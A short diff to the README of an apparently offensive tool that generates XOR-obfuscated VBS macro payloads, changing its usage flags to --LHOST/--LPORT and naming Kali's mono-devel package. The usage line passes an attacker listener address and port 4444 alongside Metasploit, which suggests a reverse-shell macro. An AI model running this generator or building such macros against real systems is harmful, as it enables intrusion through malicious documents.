@@ -63,7 +63,7 @@ cd VBS-Macro-XOR-Generator
 3. Run the script with the necessary arguments.
 
 ```sh
-python3 VBS_X0rG3n.py -lhost 10.10.10.10 -lport 4444
+python3 VBS_X0rG3n.py --LHOST 10.10.10.10 --LPORT 4444
 ```
 
 Replace `10.10.10.10` with your actual LHOST (Local Host) IP and `4444` with your desired LPORT (Local Port).
@@ -72,7 +72,7 @@ Replace `10.10.10.10` with your actual LHOST (Local Host) IP and `4444` with you
 
 - Python 3.8 or higher
 - Metasploit Framework
-- Mono (for running the compiled C# executable)
+- Mono (for running the compiled C# executable) (mono-devel in kali)
 - Git (for cloning the repository)
 
 
